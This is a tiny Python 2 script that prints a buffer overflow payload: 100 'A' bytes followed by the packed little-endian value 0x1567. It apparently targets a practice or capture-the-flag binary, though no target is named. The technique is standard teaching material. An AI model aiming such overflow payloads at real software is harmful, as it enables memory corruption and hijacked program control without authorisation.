from struct import pack

print 100 * "A" + pack("<I", 0x1567)
